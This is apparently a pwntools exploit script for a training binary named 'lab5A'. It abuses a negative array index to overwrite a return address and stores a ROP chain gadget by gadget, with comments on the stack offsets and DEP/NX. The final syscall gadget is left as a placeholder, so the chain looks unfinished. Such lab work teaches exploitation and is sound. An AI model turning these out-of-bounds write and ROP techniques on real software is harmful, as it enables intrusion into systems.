from pwn import *
import sys

context.terminal = ['tmux', 'splitw', '-h']
p = process("./lab5A")
gdb.attach(p, 'b *0x080980c0')

# signed int. is allowed  for array[]. (unsigned only has positive numbers)
# array[-11] is outside the boundary of the array's designated memory region
# If we keep decrementing we will walk the stack and eventually land on the 
# return address for store_number(). Overwriting it with user input '1111' (0x457)
num = -11

# found this number by finding the difference between our stack pointer and
# the location of our user input.
# (0xffffd19c - 0xffffd16c) = 48 - 4       = 44
#    BBBB     -   ESP	    = 48 - offset? = 44 
# add esp, 0x2c(44) to return to 'BBBB'
ret2rop = 0x08049bb7

# (DEP/NX/RW-) is enabled on the stack. NO shellcode.
# MUST use gadgets for ALL operations.
# pop [x] doesn't work because the input will take up the spot for
# add esp, 4
rop1  = 0x080980c0 # add 3, eax
rop2  = 0x0806c0a9 # add esp, 4
rop3  = 0xcccccccc
rop4  = 0x080980c0 # add 3, eax
rop5  = 0x0806c0a9 # add esp, 4
rop6  = 0xcccccccc
rop7  = 0x080980b0 # add 1, eax
rop8  = 0x0806c0a9 # add esp, 4
rop9  = 0xcccccccc
rop10 = 0x080aa04c # xchg eax, edx
rop11 = 0x0806c0a9 # add esp, 4
rop12 = 0xcccccccc
rop13 = 0x08054c30 # xor eax, eax
rop14 = 0x0806c0a9 # add esp, 4
rop15 = 0xcccccccc
rop16 = 0x080980c0 # add 3, eax
rop17 = 0x0806c0a9 # add esp, 4
rop18 = 0xcccccccc
rop19 = 0x080dc19d # : add ecx, edi ; add cl, byte ptr [edx] ; ret
rop20 = 0x0806c0a9 # add esp, 4
rop21 = 0xcccccccc
rop22 = 0x42424242 #0x0806fa7f # nop; int 0x80


p.recv()

# ROP chain
# Every number divisible by 3 is JUNK.
p.sendline('store')     # Command
p.recv()
p.sendline(str(rop1))
p.recv()
p.sendline('1')    # Index
p.recv()

p.sendline('store')     # Command
p.recv()
p.sendline(str(rop2))
p.recv()
p.sendline('2')    # Index
p.recv()

p.sendline('store')     # Command
p.recv()
p.sendline(str(rop3))
p.recv()
p.sendline('3')    # Index
p.recv()

p.sendline('store')     # Command
p.recv()
p.sendline(str(rop4))
p.recv()
p.sendline('4')    # Index
p.recv()

p.sendline('store')     # Command
p.recv()
p.sendline(str(rop5))
p.recv()
p.sendline('5')    # Index
p.recv()

p.sendline('store')     # Command
p.recv()
p.sendline(str(rop6))
p.recv()
p.sendline('6')    # Index
p.recv()

p.sendline('store')     # Command
p.recv()
p.sendline(str(rop7))
p.recv()
p.sendline('7')    # Index
p.recv()

p.sendline('store')     # Command
p.recv()
p.sendline(str(rop8))
p.recv()
p.sendline('8')    # Index
p.recv()

p.sendline('store')     # Command
p.recv()
p.sendline(str(rop9))
p.recv()
p.sendline('9')    # Index
p.recv()

p.sendline('store')     # Command
p.recv()
p.sendline(str(rop10))
p.recv()
p.sendline('10')    # Index
p.recv()
p.sendline('store')     # Command
p.recv()
p.sendline(str(rop11))
p.recv()
p.sendline('11')    # Index
p.recv()
p.sendline('store')     # Command
p.recv()
p.sendline(str(rop12))
p.recv()
p.sendline('12')    # Index
p.recv()
p.sendline('store')     # Command
p.recv()
p.sendline(str(rop13))
p.recv()
p.sendline('13')    # Index
p.recv()
p.sendline('store')     # Command
p.recv()
p.sendline(str(rop14))
p.recv()
p.sendline('14')    # Index
p.recv()
p.sendline('store')     # Command
p.recv()
p.sendline(str(rop15))
p.recv()
p.sendline('15')    # Index
p.recv()
p.sendline('store')     # Command
p.recv()
p.sendline(str(rop16))
p.recv()
p.sendline('16')    # Index
p.recv()
p.sendline('store')     # Command
p.recv()
p.sendline(str(rop17))
p.recv()
p.sendline('17')    # Index
p.recv()
p.sendline('store')     # Command
p.recv()
p.sendline(str(rop18))
p.recv()
p.sendline('18')    # Index
p.recv()
p.sendline('store')     # Command
p.recv()
p.sendline(str(rop19))
p.recv()
p.sendline('19')    # Index
p.recv()
p.sendline('store')     # Command
p.recv()
p.sendline(str(rop20))
p.recv()
p.sendline('20')    # Index
p.recv()
p.sendline('store')     # Command
p.recv()
p.sendline(str(rop21))
p.recv()
p.sendline('21')    # Index
p.recv()
p.sendline('store')     # Command
p.recv()
p.sendline(str(rop22))
p.recv()
p.sendline('22')    # Index
p.recv()







# Overwrite EIP
p.sendline('store')     # Command
p.recv()
p.sendline(str(ret2rop))
p.recv()
p.sendline('%d' % num)    # Index
p.recv()
p.interactive()
